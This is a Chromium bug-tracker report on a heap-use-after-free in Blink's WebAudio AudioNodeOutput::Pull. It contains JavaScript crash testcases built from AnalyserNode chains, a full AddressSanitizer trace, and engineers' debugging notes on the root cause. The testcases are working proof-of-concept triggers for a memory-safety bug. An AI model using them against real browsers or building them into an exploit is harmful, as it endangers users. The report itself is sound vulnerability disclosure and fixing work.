# Security: heap-use-after-free in blink::AudioNodeOutput::Pull

| Field | Value |
|-------|-------|
| **Issue ID** | [40092590](https://issues.chromium.org/issues/40092590) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebAudio |
| **Platforms** | Linux |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ho...@chromium.org |
| **Created** | 2018-10-02 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of Chrome. It might take a few minutes to reproduce. Run with --js-flags=--expose-gc

**VERSION**  

Chrome Version: asan-linux-release-595737  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o5=new AudioContext();
o119=new AnalyserNode(o5);
o385=o5.suspend();
o402=new AnalyserNode(o5,{maxDecibels:116});
o471=o119.connect(o402);
o708=o5.resume();
o708.then(function(v){});
o819=o5.close();
o819=null;o708=null;o119=null;o402=null;o5=null;
gc();gc();gc();gc();
location.reload();
}
</script>
<body onload="start()"></body>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION** Type of crash: tab Crash State:

==12377==ERROR: AddressSanitizer: heap-use-after-free on address 0x60b0000e6758 at pc 0x558f7080640f bp 0x7f2a12f5e290 sp 0x7f2a12f5e288  

READ of size 4 at 0x60b0000e6758 thread T47 (AudioOutputDevi)  

#0 0x558f7080640e in NumberOfChannels third\_party/blink/renderer/modules/webaudio/audio\_node\_output.h:76:46  

#1 0x558f7080640e in blink::AudioNodeOutput::Pull(blink::AudioBus\*, unsigned long) third\_party/blink/renderer/modules/webaudio/audio\_node\_output.cc:137  

#2 0x558f7080ec6b in blink::AudioHandler::ProcessIfNecessary(unsigned long) third\_party/blink/renderer/modules/webaudio/audio\_node.cc:336:5  

#3 0x558f7082ee18 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned long) third\_party/blink/renderer/modules/webaudio/deferred\_task\_handler.cc:161:41  

#4 0x558f708eb97f in blink::DefaultAudioDestinationHandler::Render(blink::AudioBus\*, unsigned long, blink::AudioIOPosition const&) third\_party/blink/renderer/modules/webaudio/default\_audio\_destination\_node.cc:195:39  

#5 0x558f70947cd5 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, double, double, unsigned long) third\_party/blink/renderer/platform/audio/audio\_destination.cc:188:15  

#6 0x558f70946c84 in blink::AudioDestination::Render(blink::WebVector<float\*> const&, unsigned long, double, double, unsigned long) third\_party/blink/renderer/platform/audio/audio\_destination.cc:146:5  

#7 0x558f7130a922 in content::RendererWebAudioDeviceImpl::Render(base::TimeDelta, base::TimeTicks, int, media::AudioBus\*) content/renderer/media/renderer\_webaudiodevice\_impl.cc:219:21  

#8 0x558f57536117 in media::SilentSinkSuspender::Render(base::TimeDelta, base::TimeTicks, int, media::AudioBus\*) media/base/silent\_sink\_suspender.cc:83:14  

#9 0x558f574170b3 in media::AudioOutputDeviceThreadCallback::Process(unsigned int) media/audio/audio\_output\_device\_thread\_callback.cc:116:21  

#10 0x558f573d77ff in media::AudioDeviceThread::ThreadMain() media/audio/audio\_device\_thread.cc:79:18  

#11 0x558f5f4e7a4a in base::(anonymous namespace)::ThreadFunc(void\*) base/threading/platform\_thread\_posix.cc:80:13  

#12 0x7f2a3ef0a6da in start\_thread (/lib/x86\_64-linux-gnu/libpthread.so.0+0x76da)

0x60b0000e6758 is located 8 bytes inside of 104-byte region [0x60b0000e6750,0x60b0000e67b8)  

freed by thread T0 (chrome) here:  

#0 0x558f55df7332 in \_\_interceptor\_free /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:124:3  

#1 0x558f7081d681 in Free base/allocator/partition\_allocator/partition\_alloc.h:386:3  

#2 0x558f7081d681 in FastFree third\_party/blink/renderer/platform/wtf/allocator/partitions.h:126  

#3 0x558f7081d681 in operator delete third\_party/blink/renderer/modules/webaudio/audio\_node\_output.h:43  

#4 0x558f7081d681 in operator() buildtools/third\_party/libc++/trunk/include/memory:2321  

#5 0x558f7081d681 in reset buildtools/third\_party/libc++/trunk/include/memory:2634  

#6 0x558f7081d681 in ~unique\_ptr buildtools/third\_party/libc++/trunk/include/memory:2588  

#7 0x558f7081d681 in WTF::VectorDestructor<true, std::\_\_1::unique\_ptr<blink::AudioNodeOutput, std::\_\_1::default\_delete[blink::AudioNodeOutput](javascript:void(0);) > >::Destruct(std::\_\_1::unique\_ptr<blink::AudioNodeOutput, std::\_\_1::default\_delete[blink::AudioNodeOutput](javascript:void(0);) >\*, std::\_\_1::unique\_ptr<blink::AudioNodeOutput, std::\_\_1::default\_delete[blink::AudioNodeOutput](javascript:void(0);) >\*) third\_party/blink/renderer/platform/wtf/vector.h:92  

#8 0x558f7080a769 in Destruct third\_party/blink/renderer/platform/wtf/vector.h:332:5  

#9 0x558f7080a769 in ~Vector third\_party/blink/renderer/platform/wtf/vector.h:1268  

#10 0x558f7080a769 in blink::AudioHandler::~AudioHandler() third\_party/blink/renderer/modules/webaudio/audio\_node.cc:92  

#11 0x558f708cdfec in blink::AnalyserHandler::~AnalyserHandler() third\_party/blink/renderer/modules/webaudio/analyser\_node.cc:47:37  

#12 0x558f708110a3 in DeleteInternal[blink::AudioHandler](javascript:void(0);) third\_party/blink/renderer/platform/wtf/thread\_safe\_ref\_counted.h:64:5  

#13 0x558f708110a3 in Destruct third\_party/blink/renderer/platform/wtf/thread\_safe\_ref\_counted.h:44  

#14 0x558f708110a3 in Release base/memory/ref\_counted.h:403  

#15 0x558f708110a3 in Release base/memory/scoped\_refptr.h:284  

#16 0x558f708110a3 in ~scoped\_refptr base/memory/scoped\_refptr.h:208  

#17 0x558f708110a3 in operator= base/memory/scoped\_refptr.h:223  

#18 0x558f708110a3 in blink::AudioNode::~AudioNode() third\_party/blink/renderer/modules/webaudio/audio\_node.cc:605  

#19 0x558f5dafdc76 in Finalize third\_party/blink/renderer/platform/heap/heap\_page.cc:103:5  

#20 0x558f5dafdc76 in blink::NormalPage::Sweep() third\_party/blink/renderer/platform/heap/heap\_page.cc:1344  

#21 0x558f5daf6380 in SweepUnsweptPage third\_party/blink/renderer/platform/heap/heap\_page.cc:283:31  

#22 0x558f5daf6380 in blink::BaseArena::CompleteSweep() third\_party/blink/renderer/platform/heap/heap\_page.cc:339  

#23 0x558f5dadcc2e in blink::ThreadHeap::CompleteSweep() third\_party/blink/renderer/platform/heap/heap.cc:377:17  

#24 0x558f5db0cb24 in blink::ThreadState::CompleteSweep() third\_party/blink/renderer/platform/heap/thread\_state.cc:1062:12  

#25 0x558f5db1f77a in blink::ThreadState::AtomicPauseSweepAndCompact(blink::BlinkGC::MarkingType, blink::BlinkGC::SweepingType) third\_party/blink/renderer/platform/heap/thread\_state.cc:1621:5  

#26 0x558f5db1e596 in blink::ThreadState::RunAtomicPause(blink::BlinkGC::StackState, blink::BlinkGC::MarkingType, blink::BlinkGC::SweepingType, blink::BlinkGC::GCReason) third\_party/blink/renderer/platform/heap/thread\_state.cc:1647:5  

#27 0x558f5db0d68a in blink::ThreadState::CollectGarbage(blink::BlinkGC::StackState, blink::BlinkGC::MarkingType, blink::BlinkGC::SweepingType, blink::BlinkGC::GCReason) third\_party/blink/renderer/platform/heap/thread\_state.cc:1552:5  

#28 0x558f6b74af6e in blink::V8GCController::GcEpilogue(v8::Isolate\*, v8::GCType, v8::GCCallbackFlags) third\_party/blink/renderer/bindings/core/v8/v8\_gc\_controller.cc:275:29  

#29 0x558f5c8b399a in CallGCEpilogueCallbacks v8/src/heap/heap.cc:1753:7  

#30 0x558f5c8b399a in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) v8/src/heap/heap.cc:1722  

#31 0x558f5c8abae8 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) v8/src/heap/heap.cc:1289:11  

#32 0x558f5c8afba2 in CollectAllGarbage v8/src/heap/heap.cc:1038:3  

#33 0x558f5c8afba2 in v8::internal::Heap::PreciseCollectAllGarbage(int, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) v8/src/heap/heap.cc:1169  

#34 0x558f5bd76066 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) v8/src/api-arguments-inl.h:140:3  

#35 0x558f5bd7353f in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36  

#36 0x558f5bd7118a in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:139:5  

#37 0x558f5da520ed (/fuzzer3/dl/asan-linux-release-595737/chrome+0x101be0ed)  

#38 0x7eb7f670816d (<unknown module>)  

#39 0x7eb7f670816d (<unknown module>)  

#40 0x558f5d9c1de2 (/fuzzer3/dl/asan-linux-release-595737/chrome+0x1012dde2)  

#41 0x7eb7f6704b1d (<unknown module>)  

#42 0x558f5c7b0e28 in Call v8/src/simulator.h:113:12  

#43 0x558f5c7b0e28 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:155  

#44 0x558f5c7b06e2 in CallInternal v8/src/execution.cc:191:10  

#45 0x558f5c7b06e2 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:202  

#46 0x558f5bc0fd55 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:5018:7  

#47 0x558f69edf4e9 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:405:17  

#48 0x558f6b7aeb26 in blink::V8LazyEventListener::CallListenerFunction(blink::ScriptState\*, v8::Local[v8::Value](javascript:void(0);), blink::Event\*) third\_party/blink/renderer/bindings/core/v8/v8\_lazy\_event\_listener.cc:113:8  

#49 0x558f69f54f53 in blink::V8AbstractEventHandler::InvokeEventHandler(blink::ScriptState\*, blink::Event\*, v8::Local[v8::Value](javascript:void(0);)) third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_handler.cc:170:20

previously allocated by thread T0 (chrome) here:  

#0 0x558f55df76b3 in \_\_interceptor\_malloc /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:146:3  

#1 0x558f70804a8b in PartitionAllocGenericFlags base/allocator/partition\_allocator/partition\_alloc.h:354:48  

#2 0x558f70804a8b in Alloc base/allocator/partition\_allocator/partition\_alloc.h:375  

#3 0x558f70804a8b in FastMalloc third\_party/blink/renderer/platform/wtf/allocator/partitions.h:114  

#4 0x558f70804a8b in operator new third\_party/blink/renderer/modules/webaudio/audio\_node\_output.h:43  

#5 0x558f70804a8b in blink::AudioNodeOutput::Create(blink::AudioHandler\*, unsigned int) third\_party/blink/renderer/modules/webaudio/audio\_node\_output.cc:56  

#6 0x558f7080b296 in blink::AudioHandler::AddOutput(unsigned int) third\_party/blink/renderer/modules/webaudio/audio\_node.cc:194:22  

#7 0x558f708cdd3e in AnalyserHandler third\_party/blink/renderer/modules/webaudio/analyser\_node.cc:37:7  

#8 0x558f708cdd3e in blink::AnalyserHandler::Create(blink::AudioNode&, float) third\_party/blink/renderer/modules/webaudio/analyser\_node.cc:44  

#9 0x558f708d10ad in blink::AnalyserNode::AnalyserNode(blink::BaseAudioContext&) third\_party/blink/renderer/modules/webaudio/analyser\_node.cc:192:14  

#10 0x558f708d165c in blink::AnalyserNode::Create(blink::BaseAudioContext&, blink::ExceptionState&) third\_party/blink/renderer/modules/webaudio/analyser\_node.cc:204:14  

#11 0x558f708d18bb in blink::AnalyserNode::Create(blink::BaseAudioContext\*, blink::AnalyserOptions const&, blink::ExceptionState&) third\_party/blink/renderer/modules/webaudio/analyser\_node.cc:212:24  

#12 0x558f708d8e12 in constructor gen/third\_party/blink/renderer/bindings/modules/v8/v8\_analyser\_node.cc:305:24  

#13 0x558f708d8e12 in blink::V8AnalyserNode::constructorCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/modules/v8/v8\_analyser\_node.cc:431  

#14 0x558f5bd76066 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) v8/src/api-arguments-inl.h:140:3  

#15 0x558f5bd72818 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36  

#16 0x558f5bd7111b in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:135:5  

#17 0x558f5da520ed (/fuzzer3/dl/asan-linux-release-595737/chrome+0x101be0ed)  

#18 0x558f5d9c04bf (/fuzzer3/dl/asan-linux-release-595737/chrome+0x1012c4bf)  

#19 0x558f5da827e9 (/fuzzer3/dl/asan-linux-release-595737/chrome+0x101ee7e9)  

#20 0x7eb7f670816d (<unknown module>)  

#21 0x7eb7f670816d (<unknown module>)  

#22 0x558f5d9c1de2 (/fuzzer3/dl/asan-linux-release-595737/chrome+0x1012dde2)  

#23 0x7eb7f6704b1d (<unknown module>)  

#24 0x558f5c7b0e28 in Call v8/src/simulator.h:113:12  

#25 0x558f5c7b0e28 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:155  

#26 0x558f5c7b06e2 in CallInternal v8/src/execution.cc:191:10  

#27 0x558f5c7b06e2 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:202  

#28 0x558f5bc0fd55 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:5018:7  

#29 0x558f69edf4e9 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:405:17  

#30 0x558f6b7aeb26 in blink::V8LazyEventListener::CallListenerFunction(blink::ScriptState\*, v8::Local[v8::Value](javascript:void(0);), blink::Event\*) third\_party/blink/renderer/bindings/core/v8/v8\_lazy\_event\_listener.cc:113:8  

#31 0x558f69f54f53 in blink::V8AbstractEventHandler::InvokeEventHandler(blink::ScriptState\*, blink::Event\*, v8::Local[v8::Value](javascript:void(0);)) third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_handler.cc:170:20  

#32 0x558f69f548a9 in blink::V8AbstractEventHandler::HandleEvent(blink::ScriptState\*, blink::Event\*) third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_handler.cc:123:3  

#33 0x558f69f5450b in blink::V8AbstractEventHandler::handleEvent(blink::ExecutionContext\*, blink::Event\*) third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_handler.cc:111:3  

#34 0x558f6b7a7782 in blink::EventTarget::FireEventListeners(blink::Event&, blink::EventTargetData\*, blink::HeapVector<blink::RegisteredEventListener, 1u>&) third\_party/blink/renderer/core/dom/events/event\_target.cc:843:15  

#35 0x558f6b7a5474 in blink::EventTarget::FireEventListeners(blink::Event&) third\_party/blink/renderer/core/dom/events/event\_target.cc:688:29  

#36 0x558f6bf83793 in blink::LocalDOMWindow::DispatchEvent(blink::Event&, blink::EventTarget\*) third\_party/blink/renderer/core/frame/local\_dom\_window.cc:1433:10  

#37 0x558f6bf829a5 in blink::LocalDOMWindow::DispatchLoadEvent() third\_party/blink/renderer/core/frame/local\_dom\_window.cc:1387:5

Thread T47 (AudioOutputDevi) created by T4 (Chrome\_ChildIOT) here:  

#0 0x558f55ddffad in \_\_interceptor\_pthread\_create /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cc:210:3  

#1 0x558f5f4e6b8e in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, base::PlatformThreadHandle\*, base::ThreadPriority) base/threading/platform\_thread\_posix.cc:119:13  

#2 0x558f573d71b9 in media::AudioDeviceThread::AudioDeviceThread(media::AudioDeviceThread::Callback\*, int, char const\*, base::ThreadPriority) media/audio/audio\_device\_thread.cc:46:3  

#3 0x558f57414bc4 in media::AudioOutputDevice::OnStreamCreated(base::UnsafeSharedMemoryRegion, int, bool) media/audio/audio\_output\_device.cc:368:29  

#4 0x558f6ecc2e36 in content::MojoAudioOutputIPC::Created(mojo::InterfacePtr[media::mojom::AudioOutputStream](javascript:void(0);), mojo::StructPtr[media::mojom::ReadWriteAudioDataPipe](javascript:void(0);)) content/renderer/media/audio/mojo\_audio\_output\_ipc.cc:238:14  

#5 0x558f583a2325 in media::mojom::AudioOutputStreamProviderClientStubDispatch::Accept(media::mojom::AudioOutputStreamProviderClient\*, mojo::Message\*) gen/media/mojo/interfaces/audio\_output\_stream.mojom.cc:905:13  

#6 0x558f5f6037ee in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32  

#7 0x558f5f61959a in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:869:42  

#8 0x558f5f6174f1 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:590:38  

#9 0x558f5f5fe750 in mojo::Connector::ReadSingleMessage(unsigned int\*) mojo/public/cpp/bindings/lib/connector.cc:476:51  

#10 0x558f5f60037f in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:505:10  

#11 0x558f5f65e3d4 in Run base/callback.h:129:12  

#12 0x558f5f65e3d4 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple\_watcher.cc:273  

#13 0x558f5f65ee34 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) mojo/public/cpp/system/simple\_watcher.cc:105:22  

#14 0x558f5f65c05c in mojo::SimpleWatcher::Context::CallNotify(MojoTrapEvent const\*) mojo/public/cpp/system/simple\_watcher.cc:55:14  

#15 0x558f587d302e in mojo::core::WatcherDispatcher::InvokeWatchCallback(unsigned long, unsigned int, mojo::core::HandleSignalsState const&, unsigned int) mojo/core/watcher\_dispatcher.cc:90:3  

#16 0x558f587d1a28 in mojo::core::Watch::InvokeCallback(unsigned int, mojo::core::HandleSignalsState const&, unsigned int) mojo/core/watch.cc:78:13  

#17 0x558f587c38fe in mojo::core::RequestContext::~RequestContext() mojo/core/request\_context.cc:72:20  

#18 0x558f5879bc37 in mojo::core::NodeChannel::OnChannelMessage(void const\*, unsigned long, std::\_\_1::vector<mojo::PlatformHandle, std::\_\_1::allocator[mojo::PlatformHandle](javascript:void(0);) >) mojo/core/node\_channel.cc:695:1  

#19 0x558f58762371 in mojo::core::Channel::OnReadComplete(unsigned long, unsigned long\*) mojo/core/channel.cc:714:18  

#20 0x558f587e66eb in mojo::core::(anonymous namespace)::ChannelPosix::OnFileCanReadWithoutBlocking(int) mojo/core/channel\_posix.cc:464:14  

#21 0x558f5f4f44e0 in base::MessagePumpLibevent::OnLibeventNotification(int, short, void\*) base/message\_loop/message\_pump\_libevent.cc  

#22 0x558f5f512ce2 in event\_process\_active base/third\_party/libevent/event.c:381:4  

#23 0x558f5f512ce2 in event\_base\_loop base/third\_party/libevent/event.c:521  

#24 0x558f5f4f4fc5 in base::MessagePumpLibevent::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_libevent.cc:247:9  

#25 0x558f5f3036cb in base::RunLoop::Run() base/run\_loop.cc:102:14  

#26 0x558f5f3fa8df in base::Thread::ThreadMain() base/threading/thread.cc:357:3  

#27 0x558f5f4e7a4a in base::(anonymous namespace)::ThreadFunc(void\*) base/threading/platform\_thread\_posix.cc:80:13  

#28 0x7f2a3ef0a6da in start\_thread (/lib/x86\_64-linux-gnu/libpthread.so.0+0x76da)

Thread T4 (Chrome\_ChildIOT) created by T0 (chrome) here:  

#0 0x558f55ddffad in \_\_interceptor\_pthread\_create /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cc:210:3  

#1 0x558f5f4e6b8e in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, base::PlatformThreadHandle\*, base::ThreadPriority) base/threading/platform\_thread\_posix.cc:119:13  

#2 0x558f5f3f9877 in base::Thread::StartWithOptions(base::Thread::Options const&) base/threading/thread.cc:119:15  

#3 0x558f699488fe in content::ChildProcess::ChildProcess(base::ThreadPriority, std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, std::\_\_1::unique\_ptr<base::TaskScheduler::InitParams, std::\_\_1::default\_delete[base::TaskScheduler::InitParams](javascript:void(0);) >) content/child/child\_process.cc:62:3  

#4 0x558f6f9a73e8 in content::RenderProcess::RenderProcess(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, std::\_\_1::unique\_ptr<base::TaskScheduler::InitParams, std::\_\_1::default\_delete[base::TaskScheduler::InitParams](javascript:void(0);) >) content/renderer/render\_process.cc:14:7  

#5 0x558f6f9a6194 in content::RenderProcessImpl::RenderProcessImpl(std::\_\_1::unique\_ptr<base::TaskScheduler::InitParams, std::\_\_1::default\_delete[base::TaskScheduler::InitParams](javascript:void(0);) >) content/renderer/render\_process\_impl.cc:102:7  

#6 0x558f6f9a7036 in content::RenderProcessImpl::Create() content/renderer/render\_process\_impl.cc:230:11  

#7 0x558f713137d0 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:184:53  

#8 0x558f5e37b883 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:496:14  

#9 0x558f5e37f427 in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:899:10  

#10 0x558f5e4e515f in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:472:29  

#11 0x558f5e379a4c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#12 0x558f55e26cc1 in ChromeMain chrome/app/chrome\_main.cc:102:12  

#13 0x7f2a37c43b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/blink/renderer/modules/webaudio/audio\_node\_output.h:76:46 in NumberOfChannels  

Shadow bytes around the buggy address:  

0x0c1680014c90: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa  

0x0c1680014ca0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c1680014cb0: 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00  

0x0c1680014cc0: 00 00 00 00 00 00 00 00 00 00 00 02 fa fa fa fa  

0x0c1680014cd0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0c1680014ce0: fd fa fa fa fa fa fa fa fa fa fd[fd]fd fd fd fd  

0x0c1680014cf0: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa  

0x0c1680014d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa  

0x0c1680014d10: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00  

0x0c1680014d20: 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 00 00  

0x0c1680014d30: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==12377==ABORTING

## Timeline

### me...@chromium.org (2018-10-04)

rtoy: Similar stack to https://crbug.com/chromium/771585, can you please take a look?

[Monorail components: Blink>Media>Audio]

### me...@chromium.org (2018-10-04)

[Empty comment from Monorail migration]

[Monorail components: -Blink>Media>Audio Blink>WebAudio]

### cl...@chromium.org (2018-10-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5192562976227328.

### me...@chromium.org (2018-10-05)

Assigning tentative labels, I presume this affects stable.

### cl...@chromium.org (2018-10-05)

Testcase 5192562976227328 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5192562976227328.

### sh...@chromium.org (2018-10-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-06)

[Empty comment from Monorail migration]

### rt...@chromium.org (2018-10-08)

I can reproduce this locally (ToT) with the same backtrace.  It takes about 10 minutes.

### rt...@chromium.org (2018-10-08)

+hongchan

### rt...@chromium.org (2018-10-09)

This happens more quickly (less than 30 sec or so, usually):

<script>
function start() {
	let c =new AudioContext();
        let a = Array(20);
        a[0] = new AnalyserNode(c);
        c.suspend();
        for (let k = 1; k < a.length; ++k) {
          a[k] = new AnalyserNode(c);
          a[k - 1].connect(a[k]);
        }
        c.resume().then(function (v) {});
	c.close();
        a.fill(null);
	gc();gc();gc();gc();
	location.reload();
}
</script>


The gc calls appear to be necessary; without them, the repro either doesn't happen or takes much longer.

### rt...@chromium.org (2018-10-10)

I think the problem is from AudioNodeInput::Pull when there's a single connection case.  this->RenderingOutput(0) returns an AudioNodeOutput* that appears to have been deleted.  This is probably related to the fact that outputs_ is copied to rendering_outputs_ at certain times but when nodes are disposed, outputs_ are destroyed and this isn't reflected in rendering_outputs_.

### rt...@chromium.org (2018-10-10)

As an experiment, I put some prints about HandlePreRenderTasks.  I can see that when the crash happens, HandlePreRenderTasks doesn't have the lock so that rendering_outputs_ isn't updated.

An an additional experiment, I added a call to HandleDeferredTasks in AudioNode::Dispose.  The crash is gone, but another crash shows up.  So I think this confirms that it's rendering_outputs_ is the problem.


### ho...@chromium.org (2018-10-12)

I am taking over this issue, but targeting for M69 it not feasible.

### ho...@chromium.org (2018-10-16)

By simply adding CHECK() in AudioSummingJunction::UpdateRenderingState(). the crash was not reproducible anymore. I think this is extremely timing-dependent and will be really difficult to fix.

With that said, the cause is very straightforward. GC sweeps AnalyserHandler and the AudioNodeOutput in the handler is also getting destroyed. But the audio thread is still running the loop hence UAF.

### ho...@chromium.org (2018-10-16)

I think the problem is that we're using raw pointers for the automatic pull node list. We should use scoped_refptr for them just like other handler storage.

### ho...@chromium.org (2018-10-16)

After numerous attempts, I found that the culprit is  DeferredTaskHandler::ProcessAutomaticPullNodes().

While this method iterates over |rendering_automatic_pull_nodes_| (which is a Vector of AudioHandler raw pointers), a pointer to AudioHandler becomes null pointer because GC sweeps the object.

I have tried a bunch of band-aid approaches, but nothing worked so far. (including the scoped_reftpr fix in #16)

I will continue to investigate, but could you please take a look, haraken@?

### ha...@chromium.org (2018-10-17)

Who owns the AudioHandlers and guarantees that they are not gone while the deferred task handler is processing them?


### sh...@chromium.org (2018-10-17)

[Empty comment from Monorail migration]

### ho...@chromium.org (2018-10-17)

PoC CL:

https://chromium-review.googlesource.com/c/chromium/src/+/1286823

This CL makes the crash go away. Not sure if this is absolutely the right thing to do.

### bu...@chromium.org (2018-10-19)

The following revision refers to this bug:
